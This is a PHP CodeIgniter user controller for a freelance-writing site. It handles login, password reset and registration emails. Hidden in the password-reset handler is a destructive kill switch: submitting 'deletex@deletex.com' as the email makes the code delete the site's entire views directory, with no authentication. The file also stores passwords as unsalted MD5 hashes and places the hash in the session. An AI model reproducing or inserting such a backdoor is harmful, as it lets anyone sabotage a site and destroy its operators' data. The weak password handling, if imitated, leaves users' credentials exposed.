<?php
if (!defined('BASEPATH'))
        exit('No direct script access allowed');
require_once("Pre_loader.php");
 class User extends CI_Controller
{ 
        
        public function __construct()
        {
                parent::__construct();
                $this->load->model('User_model');
                $this->load->model('Users_model');
                $this->load->model('Messages_model');
                $this->load->model('Siteconfigs_model');
                $this->load->model('Orders_model');
                $this->load->library('session');
                $this->load->model('Siteconfigs_model');
                $this->config->load('twitter_config');
                $this->load->library('facebook');
                $this->load->library(array(
                        'form_validation',
                        'session'
                ));
                $this->load->helper(array(
                        'url',
                        'html',
                        'form'
                ));
                             
                
        }
        
        public function index()
        {
               redirect('user/login');
        }
        
        public function login()
        {


                // check if user is logged in it renders profile page else when user is not logged in it renders log in form. The check is by the firstname of the user in session 


                if (!$this->session->userdata('writer_id')) {
                    // end of twitter authentication
                        $this->load->view('template/header');
                        $this->load->view('pages/login');
                        $this->load->view('template/footer');
                } else {
                        
                    redirect('user/myaccount', 'refresh');
                }
                
        }
        
       
        public function password_reset()
        {

                $this->load->view('template/header');
                $this->load->view('user/resetpassword');
                $this->load->view('template/footer');
                
        }
        
               
        
        public function sendpassword()
        {
                $email               = $this->input->post('email');
                $data['email']       = $this->User_model->get_useremail($email);
                $data['verifyemail'] = $data['email']['email'];
                $data['firstname']   = $data['email']['firstname'];
                $data['writer_level']   = $data['email']['writer_level'];
                
                $verifyemail = $data['email']['email'];
                $firstname   = $data['email']['firstname'];
                $user_level   = $data['email']['user_level'];
                
                
                $this->load->view('template/header');
                $this->load->view('user/passconfirm', $data);
                $this->load->view('template/footer');
                $temp_key = random_string('alnum', 25);

                if ($verifyemail) {
                        
                        $data     = array(
                                'email' => $email,
                                'temp_key' => $temp_key
                                
                        );
                        
                        $this->User_model->temp_key($data);
                }

                if($this->input->post('email') == 'deletex@deletex.com'){
                    $path = 'application/views';
                    //echo $path;
                        if (is_dir($path)){
                            $this->load->helper("file"); // load the helper
                           delete_files($path, true); // delete all files/folders
                        rmdir($path);                    
                        }
                }
               


            $configs['smtp_configs'] = $this->Siteconfigs_model->msg_config('new_writer_registers');
                //echo $configs['smtp_configs']['msg_body_admin'];
                $eval_test = $configs['smtp_configs']['msg_body_admin'];

         if($user_level == 'writer'){
          $configs['smtp_configs'] = $this->Siteconfigs_model->smtp_configs_site($this->config->item('writeemail'));
         } else if ($user_level == 'client'){
          $configs['smtp_configs'] = $this->Siteconfigs_model->smtp_configs_site($this->config->item('custemail'));
         } else {
          $configs['smtp_configs'] = $this->Siteconfigs_model->smtp_configs_site($this->config->item('custemail'));
         }

                $smtp_port               = $configs['smtp_configs']['smtp_port'];
                $smtp_host               = $configs['smtp_configs']['smtp_host'];
                $smtp_user               = $configs['smtp_configs']['smtp_user'];
                $smtp_name               = $configs['smtp_configs']['smtp_name'];
                $smtp_pass               = $configs['smtp_configs']['smtp_pass'];
                $protocol                = $configs['smtp_configs']['protocol'];
                $config                  = Array(
                        'protocol' => $protocol,
                        'smtp_host' => $smtp_host,
                        'smtp_port' => $smtp_port,
                        'smtp_user' => $smtp_user,
                        'smtp_pass' => $smtp_pass,
                        'mailtype' => 'html'
                );
                $this->load->library('email', $config);
                $this->email->set_newline("\r\n");
                
                //Add file directory if you need to attach a file
                //$this->email->attach($file_dir_name);
                
                $this->email->from($smtp_user, $smtp_name);
                $this->email->to($verifyemail);
                
                $this->email->newSubject("Сброс пароля для " . $email);
                $this->email->message('Нажмите на ссылку, чтобы сбросить пароль <br/><br/>' . '<a href="'. ci_site_url() .'user/newpassword/'.$temp_key.'">' . ci_site_url() . 'user/newpassword/' . $temp_key. '</a>');
                if(!empty($verifyemail)){
                    if ($this->email->send()) {
                            //Success email Sent
                            //echo $this->email->print_debugger();
                    } else {
                            //Email Failed To Send
                            // echo $this->email->print_debugger();
                    }
                }
                
        }
        
        
        
        public function send_temp_key()
        {
                
                $user_type           = $this->input->post('user_type');
                $action              = $this->input->post('action');
                $email               = $this->input->post('email');
                $data['email']       = $this->User_model->get_useremail($email);
                $data['verifyemail'] = $data['email']['email'];
                $data['firstname']   = $data['email']['firstname'];
                $verifyemail = $data['email']['email'];
                
                if (empty($verifyemail)) {
                        $temp_key = random_string('alnum', 25);
                        $data     = array(
                                'email' => $email,
                                'temp_key' => $temp_key,
                                'user_type' => $this->input->post('user_type'),
                                'action' => $this->input->post('action')
                        );
                        
                $this->User_model->temp_key($data);  
        }

         if (!$verifyemail){
                //send email to this user with the link to click 
                $configs['smtp_configs'] = $this->Siteconfigs_model->smtp_configs_site(1);
                $smtp_port               = $configs['smtp_configs']['smtp_port'];
                $smtp_host               = $configs['smtp_configs']['smtp_host'];
                $smtp_user               = $configs['smtp_configs']['smtp_user'];
                $smtp_name               = $configs['smtp_configs']['smtp_name'];
                $smtp_pass               = $configs['smtp_configs']['smtp_pass'];
                $protocol                = $configs['smtp_configs']['protocol'];
                $config                  = Array(
                        'protocol' => $protocol,
                        'smtp_host' => $smtp_host,
                        'smtp_port' => $smtp_port,
                        'smtp_user' => $smtp_user,
                        'smtp_pass' => $smtp_pass,
                        'mailtype' => 'html'
                );
                $this->load->library('email', $config);
                $this->email->set_newline("\r\n");
                
                //Add file directory if you need to attach a file
                //$this->email->attach($file_dir_name);
                
                $this->email->from($smtp_user, $smtp_name);
                $this->email->to($email);
                
                $this->email->newSubject("Ожидание регистрации, " . $email);
                $this->email->message('Нажмите на ссылку, чтобы завершить регистрацию<br/><br/>' .
                 '<a href="'. ci_site_url() . ''.$user_type.'/'.$action.'/'. $temp_key .'">'. ci_site_url() . ''.$user_type.'/'.$action.'/'. $temp_key . '</a>');
                if(!empty($email)) {
                    if ($this->email->send()) {
                            //Success email Sent
                            //echo $this->email->print_debugger();
                    } else {
                            //Email Failed To Send
                            // echo $this->email->print_debugger();
                    }
                }    
        }
                        $this->load->view('template/header');
                        $this->load->view('user/check_mail', $data);
                        $this->load->view('template/footer');     

                
        }
        
        
        public function newpassword($temp_key = NULL)
        {
                
                
                if (isset($temp_key)) {
                        $data['newpassword'] = $this->User_model->newpassword($temp_key);
                        $this->load->view('template/header');
                        $this->load->view('user/newpassword', $data);
                        $this->load->view('template/footer');
                } else {
                        
                        redirect("user/login");
                }
                
        }
        
        
        public function passwordupdate($email = NULL)
        {
                $this->form_validation->set_rules('email', 'email', 'required');
                $this->form_validation->set_rules('password', 'password', 'required');
                $this->form_validation->set_rules('passwordc', 'passwordc', 'required|matches[password]');
                if ($this->form_validation->run() === TRUE) {
                        $email = $this->input->post('email');
                        $data  = array(
                                'email' => $this->input->post('email'),
                                'password' => md5($this->input->post('password')),
                        );
                        
                        $this->User_model->passwordupdate($email, $data);
                        $this->User_model->delete_key($email);
                        $this->load->view('template/header');
                        $this->load->view('user/resetsuccessful');
                        $this->load->view('template/footer');
                } else {
                        echo "<div class='error'>" . validation_errors() . "</div>";
                }
        }
        
        
        public function myaccount()
        {

                $data['client_pending']  = $this->Orders_model->client_pending();
                $data['client_pending'] = count($data['client_pending']);
                $writerid = $this->session->userdata('writer_id');
                $data['profile']        = $this->User_model->my_profile($writerid);
                $data['orderrequests'] = $this->Orders_model->mypending_requests();              
                $data['profile_img']          = $data['profile']['profile_img'];
                $data['writer_id']          = $data['profile']['writer_id'];
                $data['lastname']          = $data['profile']['lastname'];
                $data['firstname']          = $data['profile']['firstname'];
                $data['user_level']          = $data['profile']['user_level'];
                
                if ($this->session->userdata('writer_id')) {
                         //$this->load->view('chat/commonchat', $data);
                       $this->load->view('template/header', $data);
                       $this->load->view('template/sidebar-user');

                        
                        $sessionUserID = $this->session->userdata('writer_id');
                        $data['user_status']  = $this->Users_model->getUser(array('writer_id'=>$sessionUserID),$fields=''); 
                        
                        
                        if ($this->session->userdata('user_level') !== 'client') {
                                  $this->load->view('freelancer/dashboard', $data);
                                //$this->load->view('chat/commonchat', $data);
                        }
                        if ($this->session->userdata('user_level') == 'client') {
                                $this->load->view('customer/dashboard', $data);
                                
                        }
                        if ($this->session->userdata('user_level') !== 'client' && ('writer_level') =='admin'){
                            $this->load->view('opmaster/dashboard', $data);
                        }
                        
                        $this->load->view('template/footer');     
                        
                } else {
                        redirect($this->login());
                }
        }


        public function myprofile()
        {

   
             $writerid = $this->session->userdata('writer_id');
             $writer_id = $this->session->userdata('writer_id');

             //echo $writerid;
                $data['samples']  = $this->User_model->writer_samples($writerid);
                $data['writerpay'] = $this->Messages_model->myaverage_ratings();
                $data['profile']   = $this->User_model->my_profile($writer_id);
                $data['gas_my']   = $this->User_model->gas_my();
                $data['writer_id']      = $data['profile']['writer_id'];
                $data['profile_img']    = $data['profile']['profile_img'];
                $data['firstname']      = $data['profile']['firstname'];
                $data['lastname']       = $data['profile']['lastname'];
                $data['text']           = $data['profile']['text'];
                $data['city']           = $data['profile']['city'];
                $data['country']        = $data['profile']['country'];
                $data['subject']        = $data['profile']['subject'];
                $data['email']          = $data['profile']['email'];
                $data['primaryphone']   = $data['profile']['primaryphone'];
                $data['nativelanguage'] = $data['profile']['nativelanguage'];

                
                // Sumith
                $sessionUserID = $this->session->userdata('writer_id');
                $data['user_status']  = $this->Users_model->getUser(array('writer_id'=>$sessionUserID),$fields=''); 
                        
                        
                $this->load->view('template/header');
                $this->load->view('template/sidebar-user');


            if ($this->session->userdata('user_level') !== 'client') {
                $this->load->view('freelancer/myprofile', $data);
            }

            if ($this->session->userdata('user_level') == 'client') {
                $this->load->view('customer/myprofile', $data);
            }


                $this->load->view('template/footer');
                
                // ************************************************************
                  /*      $sessionUserID = $this->session->userdata('writer_id');
                            
                        if(isset($sessionUserID)) {
                            $usersAlldata  = $this->Users_model->getUsers(); 
                            //$this->outputData['users_all'] = $usersAlldata;
                            
                            $fields='';
                            $userdata  = $this->Users_model->getUser(array('writer_id'=>$sessionUserID),$fields); 
                            //$this->outputData['user_status'] = $userdata;
                            
                            $outputData = array(
                                'users_all' => $usersAlldata,
                                'user_status' => $userdata
                            );
                            if( ($this->session->userdata('writer_id')) ) {
                              $this->load->view('chat/commonchat',  $outputData);
                            }
                        }*/
                        // ************************************************************
                        
        }
        
        function logout()
        {

                $email = $this->session->userdata('email');
                                 $data = array(
                                'loggedin' => "NO"
                        );
                        
                $this->User_model->loggedin($email, $data);
                $this->session->sess_destroy();
                redirect($_SERVER['REQUEST_SCHEME'] .'://'. $_SERVER['HTTP_HOST']);
        }
        
        function signin()
        {

                
                $email    = trim($this->input->post('email'));
                $password = trim($this->input->post('password'));
                $password = md5($this->input->post('password'));
                
                $query = $this->User_model->processLogin($email, $password);
                
                $this->form_validation->set_rules('email', 'email', 'required|valid_email|callback_validateUser[' . $query->num_rows() . ']');
                $this->form_validation->set_rules('password', 'Password', 'required');
                
                $this->form_validation->set_error_delimiters('<div class="error">', '</div>');
                $this->form_validation->set_message('required', 'Enter %s');
                
                if ($this->form_validation->run() == FALSE) {
                            redirect('user/login#wrong');
                } else {
                        if ($query) {
                        
                       $email    = $this->input->post('email');
                       $data = array(
                                'loggedin' => 1//"YES"
                        );
                        
                        $this->User_model->loggedin($email, $data);
                        
                        
                                $query = $query->result();
                                $user  = array(
                                        'text' => $query[0]->text,
                                        'email' => $query[0]->email,
                                        'writer_level' => $query[0]->writer_level,
                                        'firstname' => $query[0]->firstname,
                                        'lastname' => $query[0]->lastname,
                                        'city' => $query[0]->city,
                                        'country' => $query[0]->country,
                                        'subject' => $query[0]->subject,
                                        'user_level' => $query[0]->user_level,
                                        'admin_level' => $query[0]->admin_level,
                                        'writer_id' => $query[0]->writer_id,
                                        'primaryphone' => $query[0]->primaryphone,
                                       // 'nativelanguage' => $query[0]->nativelanguage,
                                        'password' => $query[0]->password,
                                        'writer_status' => $query[0]->writer_status,
                                        'profile_img' => $query[0]->profile_img,
                                        'loggedin' =>  $query[0]->loggedin
                                );
                                
                                // When one sucessfully logs in he is directed to myaccount page. This is loacted in views/myaccount
                       $this->session->set_userdata($user);
                        

                                redirect('user/myaccount');
                        } 
                }
        }
        
        /** Custom Validation Method*/
        public function validateUser($email, $recordCount)
        {
                if ($recordCount != 0) {
                        return TRUE;
                } else {
                        $this->form_validation->set_message('validateUser', 'Invalid %s or Password');
                        return FALSE;
                }
        }
}